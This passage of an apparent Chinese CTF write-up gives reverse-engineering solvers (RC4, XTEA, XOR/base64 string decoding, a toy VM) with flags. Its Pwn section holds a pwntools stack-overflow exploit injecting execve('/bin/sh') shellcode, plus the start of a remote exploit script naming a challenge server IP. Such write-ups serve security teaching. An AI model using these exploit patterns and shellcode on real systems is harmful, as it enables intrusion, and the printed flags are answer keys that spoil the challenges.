class="hljs-number">0xd4</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0xfe</span>,<span class="hljs-number">0xbc</span> &#125;;    BYTE  key[<span class="hljs-number">8</span>] = &#123; <span class="hljs-number">0x01</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xEF</span> &#125;;    <span class="hljs-keyword">int</span> i, j, k, a,b;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rc4</span> <span class="hljs-title">s</span>;</span>    <span class="hljs-keyword">int</span> length = <span class="hljs-number">8</span>;    <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));    s.x = <span class="hljs-number">0</span>;    s.y = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)        s.m[i] = i;    j = k = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)    &#123;        a = s.m[i];        j = (uint8)(j + a + key[k]);        s.m[i] = s.m[j];         s.m[j] = a;        <span class="hljs-keyword">if</span> (++k &gt;= length)            k = <span class="hljs-number">0</span>;    &#125;​    length = <span class="hljs-number">32</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)    &#123;        s.x = (uint8)(s.x + <span class="hljs-number">1</span>);        a = s.m[s.x];        s.y = (uint8)(s.y + a);        s.m[s.x] = b = s.m[s.y];        s.m[s.y] = a;        flag[i] = cmp[i] ^ s.m[(uint8)(a + b)];    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>, flag);&#125;</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Stangeapk"><a href="#Stangeapk" class="headerlink" title="Stangeapk"></a>Stangeapk</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>使用jeb3.0打开apk发现字符串被加密了</p><p><img src="https://uploader.shimo.im/f/NsSEoVt9TXvm18Gq.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>查看加密函数发现为异或+base64加密 ，编写解密函数</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringFog</span> </span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] xor(<span class="hljs-keyword">byte</span>[] data, String key) &#123;     <span class="hljs-comment">//异或算法</span>    <span class="hljs-keyword">int</span> len = data.length;    <span class="hljs-keyword">int</span> lenKey = key.length();    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (i &lt; len) &#123;        <span class="hljs-keyword">if</span> (j &gt;= lenKey) &#123;            j = <span class="hljs-number">0</span>;        &#125;        data[i] = (<span class="hljs-keyword">byte</span>) (data[i] ^ key.charAt(j));        i++;        j++;    &#125;    <span class="hljs-keyword">return</span> data;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">encode</span><span class="hljs-params">(String data, String key)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(xor(data.getBytes(), key)));    <span class="hljs-comment">//调用base64加密包</span>&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">decode</span><span class="hljs-params">(String data, String key)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String(xor(Base64.getDecoder().decode(data), key));    <span class="hljs-comment">//调用base64解密包</span>&#125;</code></pre><p>得到关键字符串</p><pre><code class="hljs java"><span class="hljs-keyword">if</span>(!name.equals(<span class="hljs-string">&quot;WLLM&quot;</span>)) &#123;                Toast.makeText(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;please input your name&quot;</span>, <span class="hljs-number">0</span>).show();                <span class="hljs-keyword">return</span>;            &#125;<span class="hljs-keyword">if</span>(!password.equals(<span class="hljs-string">&quot;welcome_to_SWPUCtf&quot;</span>)) &#123;                Toast.makeText(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;please input your password&quot;</span>, <span class="hljs-number">0</span>).show();                <span class="hljs-keyword">return</span>;            &#125;HttpURLConnection connection = (HttpURLConnection)<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://121.196.219.16:8080/ForAndroid/mustLogin?logname=1&amp;password=1&quot;</span>).openConnection();</code></pre><p>可以发现这是一个http请求，输入账号密码或者直接访问url均可达到目的<br>得到服务器返回的字符串：</p><p><img src="https://uploader.shimo.im/f/I7MKKE2GSURW5GOV.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>根据url下载附件realapp</p><blockquote><p>ps：jeb 3.9及以后会自动解密字符串</p></blockquote><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>反编译apk</p><p>该apk验证流程为:</p><p>对输入内容进行凯撒加密，其中凯撒key被hook了，返回值为18，传入到native层，并对字符串进行异或操作，然后和值进行比较</p><p>hook代码：</p><p><img src="https://uploader.shimo.im/f/2jdDNB54Z7IQsv1h.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/rQ2HnjIWtwOBroox.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>其中几个重要参数：</p><pre><code class="hljs plain">比较字符串：&#123;122,125,119,121,71,104,84,85,79,99,13,79,99,125,99,107,78,12,110,91,99,122,13,12,91,65&#125;异或的值：getInt()函数返回值，一个xtea算法的解密，其中v为&#123;(unsigned int)-355481616,(unsigned int)1654711569&#125;，key为&#123;1,2,3,4&#125;，返回值为v[0]</code></pre><p>通过动态调试或者frida hook,或者观察log日志(出题人忘删除log了,难过.png)<br>可以得到 v[0]=40</p><p>脚本如下：</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-keyword">char</span> small_letter[<span class="hljs-number">26</span>] = &#123; <span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span> &#125;;<span class="hljs-keyword">char</span> big_letter[<span class="hljs-number">26</span>] = &#123; <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;J&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;Q&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;X&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Z&#x27;</span> &#125;;<span class="hljs-keyword">char</span> result[<span class="hljs-number">1000</span>];<span class="hljs-keyword">int</span> p;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>* v, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>* key)</span> </span>&#123;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>, delta = <span class="hljs-number">0x9e3779b9</span>;sum = delta * <span class="hljs-number">32</span>;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;r -= (((l &lt;&lt; <span class="hljs-number">4</span>) ^ (l &gt;&gt; <span class="hljs-number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);sum -= delta;l -= (((r &lt;&lt; <span class="hljs-number">4</span>) ^ (r &gt;&gt; <span class="hljs-number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);&#125;v[<span class="hljs-number">0</span>] = l;v[<span class="hljs-number">1</span>] = r;&#125;<span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">carse</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* estr,<span class="hljs-keyword">int</span> <span class="hljs-built_in">move</span>)</span> </span>&#123;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(estr); i++)&#123;<span class="hljs-keyword">if</span>(estr[i]&gt;=<span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;estr[i]&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>)        &#123;            p=((estr[i]-<span class="hljs-string">&#x27;A&#x27;</span>)- <span class="hljs-built_in">move</span>);            <span class="hljs-keyword">while</span>(p&lt;<span class="hljs-number">0</span>)p+=<span class="hljs-number">26</span>;            result[i]=big_letter[p];        &#125;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (estr[i]&gt;=<span class="hljs-string">&#x27;a&#x27;</span>&amp;&amp;estr[i]&lt;=<span class="hljs-string">&#x27;z&#x27;</span>)        &#123;            p=((estr[i]-<span class="hljs-string">&#x27;a&#x27;</span>)- <span class="hljs-built_in">move</span>);            <span class="hljs-keyword">while</span>(p&lt;<span class="hljs-number">0</span>)p+=<span class="hljs-number">26</span>;            result[i]=small_letter[p];        &#125;        <span class="hljs-keyword">else</span> result[i]= estr[i];&#125;<span class="hljs-keyword">return</span> result;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span><span class="hljs-function"></span>&#123;<span class="hljs-comment">//test</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v[<span class="hljs-number">2</span>] = &#123; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">-355481616</span>,(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">1654711569</span> &#125;, key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> &#125;;<span class="hljs-keyword">char</span> *FK = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">50</span>);<span class="hljs-keyword">char</span> *b = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">50</span>);<span class="hljs-keyword">int</span> c[] = &#123; <span class="hljs-number">122</span>,<span class="hljs-number">125</span>,<span class="hljs-number">119</span>,<span class="hljs-number">121</span>,<span class="hljs-number">71</span>,<span class="hljs-number">104</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">79</span>,<span class="hljs-number">99</span>,<span class="hljs-number">13</span>,<span class="hljs-number">79</span>,<span class="hljs-number">99</span>,<span class="hljs-number">125</span>,<span class="hljs-number">99</span>,<span class="hljs-number">107</span>,<span class="hljs-number">78</span>,<span class="hljs-number">12</span>,<span class="hljs-number">110</span>,<span class="hljs-number">91</span>,<span class="hljs-number">99</span>,<span class="hljs-number">122</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">91</span>,<span class="hljs-number">65</span> &#125;;decrypt(v, key);<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) &#123;FK[i] = c[i] ^ v[<span class="hljs-number">0</span>];&#125;b = carse(FK, <span class="hljs-number">18</span>);<span class="hljs-built_in">string</span> eflag=b;<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;flag is:&quot;</span> &lt;&lt; eflag.substr(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="where-is-temp"><a href="#where-is-temp" class="headerlink" title="where_is_temp"></a>where_is_temp</h2><p>本题是通过C语言来调用lua脚本，实现flag的获取与验证操作，所以关键点就是要能提取出原始的lua脚本进行分析。</p><p>首先是C语言部分比较简单，就是一些垃圾的反调试，然后就是文件操作，将文件释放到临时文件夹中，拿到了这个脚本发现是luac脚本，luac文件转lua文件其实可以选择的工具很多，我自己选择的是luadec，值得一提的是luadec需要确定具体的lua使用的版本，而这可以通过ida查看程序的字符串就可以发现是lua5.3，这样我们基本就能完整还原出lua文件了。</p><p>lua脚本中就是一些简单的换位，异或，查表操作等，当然最后两位比较特殊，看似有多解，但根据费马大定理可得其实n只能等于2，而m就等于40，当然熟悉勾三股四弦五的话很容易也可以猜到。</p><p>flag：luA1s_(2_Easy_To_y0u_!!!</p><h2 id="简陋的vm"><a href="#简陋的vm" class="headerlink" title="简陋的vm"></a>简陋的vm</h2><p>这道题其实就是一个简单的使用c语言模拟执行的vm，本身并没有做什么处理，只需要找到分发器的位置，再将每一条handle解析出来就能还原汇编。</p><p>首先是分发器，利用的是push/ret的方式调用的，获取需要call的函数地址，将参数与返回地址依次入栈，最后压入跳转地址ret就可以了，所以需要动态调试一下。</p><pre><code class="hljs c++">add_call = call_list[vm_call];__asm&#123; push i; sub esp, <span class="hljs-number">0x4</span>; mov eax, v_ret; mov dword ptr ss : [esp] , eax; push add_call; ret;v_ret: mov i, eax; &#125;</code></pre><p>接下来就是解析每个handle，原本的汇编指令应该如下所示：</p><pre><code class="hljs c++"><span class="hljs-keyword">signed</span> opcode[<span class="hljs-number">219</span>] = &#123;op_mov, <span class="hljs-number">6</span>, op_ebp, op_esp,op_sub, op_esp, <span class="hljs-number">54</span>,op_push, op_esi, <span class="hljs-comment">//2 push esi</span>op_push, op_edi, <span class="hljs-comment">//2 push edi</span>op_mov, <span class="hljs-number">4</span>, op_ecx, <span class="hljs-number">9</span>,<span class="hljs-comment">//4 mov ecx,0x9</span>op_mov, <span class="hljs-number">0x10</span>, op_esi, <span class="hljs-comment">//3 mov esi,Project2.00C620F8</span>op_lea, op_edi, <span class="hljs-number">-0x50</span>,<span class="hljs-comment">//3 lea edi,dword ptr ss:[ebp-0x50]</span>op_rep_movs,    <span class="hljs-comment">//1 rep movs dword ptr es:[edi],dword ptr ds:[esi]</span>op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0</span>,<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],0x0</span>op_jmp,<span class="hljs-number">12</span>,<span class="hljs-comment">//2 jmp short Project2.00C61033</span>op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>op_add, op_eax, <span class="hljs-number">0x1</span>,<span class="hljs-comment">//3 add eax,0x1</span>op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, op_eax,<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],eax</span>op_cmp, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0x24</span>,<span class="hljs-comment">//3 cmp dword ptr ss:[ebp-0x54],0x24</span>op_jge, <span class="hljs-number">89</span>,<span class="hljs-comment">//2 jge Project2.00C610D6</span>op_mov, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov ecx,dword ptr ss:[ebp-0x54]</span>op_and, op_ecx, <span class="hljs-number">0x80000001</span>,<span class="hljs-comment">//3 and ecx,0x80000001</span>op_jns, <span class="hljs-number">8</span>,<span class="hljs-comment">//2 jns short Project2.00C6104D</span>op_dec, op_ecx,<span class="hljs-comment">//2 dec ecx</span>op_or, op_ecx, <span class="hljs-number">-0x2</span>,<span class="hljs-comment">//3 or ecx,-0x2</span>op_inc, op_ecx,<span class="hljs-comment">//2 inc ecx</span>op_test, op_ecx, op_ecx,<span class="hljs-comment">//3 test ecx,ecx</span>op_je, <span class="hljs-number">35</span>,<span class="hljs-comment">//2 je short Project2.00C6106F</span>op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10B</span>, op_eax, op_edx, <span class="hljs-number">-0x50</span>,<span class="hljs-comment">//5 movzx eax,byte ptr ss:[ebp+edx-0x50]</span>op_add, op_eax, <span class="hljs-number">0x5</span>,<span class="hljs-comment">//3 add eax,0x5</span>op_mov, <span class="hljs-number">4</span>, op_ecx, <span class="hljs-number">0x68</span>,<span class="hljs-comment">//4 mov ecx,0x68</span>op_sub, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 sub ecx,dword ptr ss:[ebp-0x54]</span>op_xor, op_eax, op_ecx,<span class="hljs-comment">//3 xor eax,ecx</span>op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10D</span>, op_edx, <span class="hljs-number">-0x2c</span>, op_eax,<span class="hljs-comment">//5 mov byte ptr ss:[ebp+edx-0x2C],al</span>op_jmp,<span class="hljs-number">32</span>,<span class="hljs-comment">//2 jmp short Project2.00C61089</span>op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10B</span>, op_ecx, op_eax, <span class="hljs-number">-0x50</span>,<span class="hljs-comment">//5 movzx ecx,byte ptr ss:[ebp+eax-0x50]</span>op_sub, op_ecx, <span class="hljs-number">0x3</span>,<span class="hljs-comment">//3 sub ecx,0x3</span>op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>op_add, op_edx, <span class="hljs-number">0x67</span>,<span class="hljs-comment">//3 add edx,0x67</span>op_xor, op_ecx, op_edx,<span class="hljs-comment">//3 xor ecx,edx</span>op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10D</span>, op_eax, <span class="hljs-number">-0x2c</span>, op_ecx, <span class="hljs-comment">//5 mov byte ptr ss:[ebp+eax-0x2C],cl</span>op_jmp,<span class="hljs-number">-103</span>,<span class="hljs-comment">//2 jmp</span>op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0x0</span>,<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],0x0</span>op_jmp,<span class="hljs-number">12</span>,<span class="hljs-comment">//2 jmp short Project2.00C6109B</span>op_mov, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov ecx,dword ptr ss:[ebp-0x54]</span>op_add, op_ecx, <span class="hljs-number">0x1</span>,<span class="hljs-comment">//3 add ecx,0x1</span>op_mov, <span class="hljs-number">5</span>, <span class="hljs-number">-0x54</span>, op_ecx,<span class="hljs-comment">//4 mov dword ptr ss:[ebp-0x54],ecx</span>op_cmp, <span class="hljs-number">-0x54</span>, <span class="hljs-number">0x12</span>,<span class="hljs-comment">//3 cmp dword ptr ss:[ebp-0x54],0x12</span>op_jge,<span class="hljs-number">59</span>,<span class="hljs-comment">//2 jge short Project2.00C610D1</span>op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>op_add, op_edx, <span class="hljs-number">0x32</span>,<span class="hljs-comment">//3 add edx,0x32</span>op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10B</span>, op_ecx, op_eax, <span class="hljs-number">-0x2c</span>, <span class="hljs-comment">//5 movzx ecx,byte ptr ss:[ebp+eax-0x2C]</span>op_xor, op_ecx, op_edx,<span class="hljs-comment">//3 xor ecx,edx</span>op_mov, <span class="hljs-number">3</span>, op_edx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov edx,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10D</span>, op_edx, <span class="hljs-number">-0x2c</span>, op_ecx,<span class="hljs-comment">//5 mov byte ptr ss:[ebp+edx-0x2C],cl</span>op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>op_add, op_eax, <span class="hljs-number">0x23</span>,<span class="hljs-comment">//3 add eax,0x23</span>op_mov, <span class="hljs-number">3</span>, op_ecx, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov ecx,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10B</span>, op_edx, op_ecx, <span class="hljs-number">-0x1a</span>,<span class="hljs-comment">//5 movzx edx,byte ptr ss:[ebp+ecx-0x1A]</span>op_xor, op_edx, op_eax,<span class="hljs-comment">//3 xor edx,eax</span>op_mov, <span class="hljs-number">3</span>, op_eax, <span class="hljs-number">-0x54</span>,<span class="hljs-comment">//4 mov eax,dword ptr ss:[ebp-0x54]</span>op_mov, <span class="hljs-number">0x10D</span>, op_eax, <span class="hljs-number">-0x1a</span>,  op_edx,<span class="hljs-comment">//5 mov byte ptr ss:[ebp+eax-0x1A],dl</span>op_jmp,<span class="hljs-number">-73</span>,<span class="hljs-comment">//2 jmp short Project2.00C61092</span>op_xor, op_eax, op_eax,<span class="hljs-comment">//3 xor eax,eax</span>op_pop, op_edi,<span class="hljs-comment">//2 pop edi</span>op_pop, op_esi,<span class="hljs-comment">//2 pop esi</span>&#125;;</code></pre><p>其中寄存器标识就是指代需要使用的寄存器，唯一需要注意的只有在处理mov指令时，还需要根据后一位的标志符来进行判断处理，这里就不再赘述。<br>以上的汇编代码其实是完全按照一段简单的加密翻译的，其实算法本身完全没有难度</p><pre><code class="hljs c++"> unit8 szBuffer[] = <span class="hljs-string">&quot;flag&#123;w31c0m325wpuc7f@havea9o0d71m3&#125;&quot;</span>;unit8 out[<span class="hljs-number">36</span>];<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">36</span>; ++i)&#123;<span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span>)&#123;out[i] = (szBuffer[i] + JI) ^ (<span class="hljs-number">0x68</span> - i);&#125;<span class="hljs-keyword">else</span>&#123;out[i] = (szBuffer[i] - OU) ^ (<span class="hljs-number">0x67</span> + i);&#125;&#125;<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">18</span>; ++i)&#123;out[i] ^= (i + <span class="hljs-number">0x32</span>);out[i + <span class="hljs-number">18</span>] ^= (i + <span class="hljs-number">0x23</span>);</code></pre><p>所以我们甚至可以找到模拟的栈中存放我们输入的位置，并找到加密后的存放位置观察其变化，也能进行解析。<br>至于输入的位置其实可以看见就是利用了lea/rep movs两条指令，所以不管你输入多少，都会取出36位进行加密，只要找到这里，紧跟在后续的位置就是存放加密后的位置。</p><h2 id="Re-exe"><a href="#Re-exe" class="headerlink" title="Re.exe"></a>Re.exe</h2><p>这道题的思想是 A * B = C</p><p>A矩阵可逆，B矩阵是由输入的18个字符低4bit,高4bit位构成6*6的矩阵。</p><p>验证1：字符串长度，验证2：B矩阵的和，验证3: A*B是否等于C</p><p>已知AC,求B</p><p>B = A的逆矩阵*C</p><p>然后再根据B矩阵拼接回去，即可得到flag.</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="shellco"><a href="#shellco" class="headerlink" title="shellco"></a>shellco</h2><p>在输入name后，如果name的长度等于8，将获得一次输入的机会，此次输入存在溢出，可以修改之后的对话次数，在栈的最顶上存放着一个地址，该地址为对话循环的跳转位置，多次对话将不停向栈上压入对话内容，直到覆盖栈的顶部，修改跳转位置为shellcode。</p><p>由于所有被保存的输入都不超过8个字节，且输入后都会再向栈上压入内容，所以shellcode本身不能超过8个字节。shellcode编写思路：在程序开始时，r12寄存器保存了“/bin/sh”的地址，跳转前会执行rax，rbx，rcx，rdx的清零，故shellcode为”mov rbx,r12;mov al,11;int 0x80”</p><p>wp</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)p=process(<span class="hljs-string">&quot;./1&quot;</span>)<span class="hljs-comment">#p=remote(&quot;49.235.209.57&quot;,10000)</span>sleep(<span class="hljs-number">0.1</span>)p.send(<span class="hljs-string">&quot;\xff&quot;</span>*<span class="hljs-number">8</span>)sleep(<span class="hljs-number">0.1</span>)p.send(<span class="hljs-string">&quot;\xff&quot;</span>*<span class="hljs-number">40</span>+<span class="hljs-string">&quot;\x18&quot;</span>)sleep(<span class="hljs-number">0.1</span>)a=<span class="hljs-number">16</span><span class="hljs-comment">#pay=&quot;\x4c\x89\xe3\xb0\x0b\xcd\x80&quot;</span>pay=asm(<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">mov rbx,r12;</span><span class="hljs-string">mov al,11;</span><span class="hljs-string">int 0x80</span><span class="hljs-string">&quot;&quot;&quot;</span>)<span class="hljs-keyword">print</span> len(pay)sleep(<span class="hljs-number">0.1</span>)p.send(pay)<span class="hljs-keyword">while</span>(a):sleep(<span class="hljs-number">0.1</span>)a=a<span class="hljs-number">-1</span>p.sendafter(<span class="hljs-string">&quot;you lost&quot;</span>,<span class="hljs-string">&quot;\x89\x05\x60\x00\x00\x00\x00\x00&quot;</span>)p.recv()p.interactive()</code></pre><h2 id="tnote"><a href="#tnote" class="headerlink" title="tnote"></a>tnote</h2><pre><code class="hljs plain"># -*- coding: utf-8 -*-import sysimport osfrom pwn import *# context.log_level &#x3D; &#39;debug&#39;binary &#x3D; &quot;.&#x2F;tnote&quot;ip &#x3D; &quot;47.98.229.132&quot;port &#x3D; 10000elf &#x3D; ELF(binary)def pwn(ip, port, debug):    if debug &#x3D;&#x3D; 1:        sh &#x3D; process(binary)        lib &#x3D; elf.libc        # lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)    else:        sh &#x3D; remote(ip, port)        lib &#x3D; ELF(&quot;libc-2.27.so&quot;)        # lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)    s       &#x3D; lambda 